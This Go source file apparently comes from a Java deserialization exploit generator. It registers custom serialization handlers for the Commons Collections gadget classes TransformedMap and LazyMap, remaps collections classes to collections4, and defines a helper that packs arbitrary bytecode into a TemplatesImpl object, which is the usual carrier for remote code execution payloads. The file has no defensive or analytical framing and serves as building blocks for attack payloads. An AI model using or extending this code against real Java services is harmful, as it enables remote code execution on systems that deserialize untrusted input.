package serlib

import (
	"goserja/impl"
	"goserja/java"
	"math/rand"
	"strings"
	"time"
)

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

var AppClassLoader *java.ClassLoader

var loader *java.ClassLoader

func loadClass(className string) *Class {
	return AppClassLoader.LoadClass(className)
}

func init() {
	AppClassLoader = java.NewClassLoader(nil)
	CommonsCollection3Jar.LoadJar(AppClassLoader)
	loader = AppClassLoader
	CommonsCollection3Jar.HookDefineClass(func(class *java.Class) java.Class {
		if strings.Contains(class.Name, ".collections.") {
			class.Name = strings.ReplaceAll(class.Name, ".collections.", ".collections4.")
		}
		for i, field := range class.Fields {
			if strings.Contains(field.Descriptor, ".collections.") {
				f := &field
				f.Descriptor = strings.ReplaceAll(field.Descriptor, ".collections.", ".collections4.")
				class.Fields[i] = *f
			}
		}
		return *class
	}).LoadJar(loader)
	//注册writeObject

	java.SetContextClassLoader(AppClassLoader)

	// TransformedMap
	TransformedMapWriteObject := func(ser interface{}, obj *java.Object) {
		js := ser.(*impl.JavaSerializer)
		js.DefaultWriteObject(obj)
		js.WriteAllTypeData(obj.Fields["map"], obj.GetFieldDescriptor("map"))
	}
	loader.RegisterWriteObject(TransformedMapWriteObject, "org.apache.commons.collections.map.TransformedMap")
	loader.RegisterWriteObject(TransformedMapWriteObject, "org.apache.commons.collections4.map.TransformedMap")

	TransformedMapReadObject := func(ser interface{}, obj *java.Object) error {
		js := ser.(*impl.JavaDeserializer)
		if err := js.DefaultReadObject(); err != nil {
			return err
		}
		mapVal, err := js.ReadObject()
		if err != nil {
			return err
		}
		obj.Fields["map"] = mapVal
		return nil
	}
	loader.RegisterReadObject(TransformedMapReadObject, "org.apache.commons.collections.map.TransformedMap")

	//LazyMap
	LazyMapWriteObject := func(ser interface{}, obj *java.Object) {
		// LazyMap#writeObject
		//	out.defaultWriteObject();
		//  out.writeObject(map);
		js := ser.(*impl.JavaSerializer)
		js.SetBlkMode(false)
		js.WriteAllTypeData(obj.Fields["factory"], obj.GetFieldDescriptor("factory"))
		js.SetBlkMode(true)
		js.WriteAllTypeData(obj.Fields["map"], obj.GetFieldDescriptor("map"))
	}
	loader.RegisterWriteObject(LazyMapWriteObject, "org.apache.commons.collections.map.LazyMap")
	loader.RegisterWriteObject(LazyMapWriteObject, "org.apache.commons.collections4.map.LazyMap")

	LazyMapReadObject := func(ser interface{}, obj *java.Object) error {
		deserializer := ser.(*impl.JavaDeserializer)
		if err := deserializer.DefaultReadObject(); err != nil {
			return err
		}
		mapVal, err := deserializer.ReadObject()
		if err != nil {
			return err
		}
		obj.Fields["map"] = mapVal
		return nil
	}
	loader.RegisterReadObject(LazyMapReadObject, "org.apache.commons.collections.map.LazyMap")
	loader.RegisterReadObject(LazyMapReadObject, "org.apache.commons.collections4.map.LazyMap")
}

func NewTemplesImpl(name string, bytecodes []byte) java.Object {
	class := java.TemplatesImplClass
	templates := class.NewInstance(nil)
	templates.Fields["_name"] = name
	templates.Fields["_bytecodes"] = [][]byte{bytecodes}
	return templates
}

func randomName(n int) string {
	rand.Seed(time.Now().UnixNano()) // 设置随机种子
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
